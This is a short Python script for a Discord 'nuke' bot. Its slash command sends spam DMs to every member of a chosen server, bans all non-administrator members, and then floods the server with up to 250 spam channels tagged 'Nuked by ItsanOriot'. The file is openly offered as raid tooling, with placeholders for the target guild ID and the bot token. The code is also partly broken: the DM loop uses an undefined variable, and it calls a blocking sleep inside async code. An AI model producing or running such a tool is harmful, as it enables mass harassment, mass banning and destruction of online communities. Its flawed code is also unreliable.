import discord
from discord import app_commands
import time
import random

intents = discord.Intents.all()
intents.message_content = True
client = discord.Client(intents=intents)
tree = app_commands.CommandTree(client)
guildID = 123 #replace this with the id of the guild you want to nuke


@client.event
async def on_ready():
    await tree.sync(guild=discord.Object(id=guildID))
    print(f'Bot User: {client.user}')

@tree.command(name = "nuke", description = "bye bye", guild=discord.Object(id=guildID))
async def massdm(interaction, channels: int = 250):
    await interaction.response.send_message("Mass dm starting, all users with low perms will be banned", ephemeral=True)
    for member in interaction.guild.members:
        if member != client.user and not member.bot:
            time.sleep(1/25)
            await member.send('Nuked by ItsanOriot %s poop' % ((i+1)*random.randint(1, 79274817693)))
            if not member.guild_permissions.administrator:
                await member.ban()
    
    await interaction.followup.send("Mass dm completed, beginning channel spam", ephemeral=True)
    for i in range(channels):
        time.sleep(1/25)
        await interaction.guild.create_text_channel(('Nuked by ItsanOriot %s poop' % ((i+1)*random.randint(1, 79274817693))))
    await interaction.followup.send("Channel spam completeted. Nuke finished", ephemeral=True)

   

client.run('YOUR BOT TOKEN') #put your bot token in here
